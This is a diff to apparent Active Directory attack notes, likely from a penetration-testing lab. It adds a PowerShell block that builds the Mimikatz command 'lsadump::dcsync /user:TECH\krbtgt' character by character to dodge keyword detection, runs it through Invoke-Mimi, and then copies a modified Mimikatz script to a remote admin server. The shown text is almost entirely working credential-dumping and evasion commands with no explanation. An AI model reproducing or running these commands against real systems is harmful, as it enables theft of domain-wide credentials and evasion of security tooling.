@@ -57,6 +57,23 @@ Invoke-Mimi -Command $Pwn
 
 ```
 
+```powershell
+# Build 'lsadump::dcsync'
+$a1 = "l"; $a2 = "s"; $a3 = "a"; $a4 = "d"; $a5 = "u"; $a6 = "m"; $a7 = "p";
+$a8 = ":"; $a9 = ":"; $a10 = "d"; $a11 = "c"; $a12 = "s"; $a13 = "y"; $a14 = "n"; $a15 = "c";
+$cmd1 = $a1 + $a2 + $a3 + $a4 + $a5 + $a6 + $a7 + $a8 + $a9 + $a10 + $a11 + $a12 + $a13 + $a14 + $a15;
+
+# Build '/user:TECH\krbtgt'
+$b1 = "/"; $b2 = "u"; $b3 = "s"; $b4 = "e"; $b5 = "r"; $b6 = ":"; 
+$b7 = "T"; $b8 = "E"; $b9 = "C"; $b10 = "H"; $b11 = "\"; 
+$b12 = "k"; $b13 = "r"; $b14 = "b"; $b15 = "t"; $b16 = "g"; $b17 = "t";
+$cmd2 = " " + $b1 + $b2 + $b3 + $b4 + $b5 + $b6 + $b7 + $b8 + $b9 + $b10 + $b11 + $b12 + $b13 + $b14 + $b15 + $b16 + $b17;
+
+# Combine and execute
+$Pwn = $cmd1 + $cmd2
+Invoke-Mimi -Command $Pwn
+```
+
 Copy to machine and run
 ```powershell
 Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
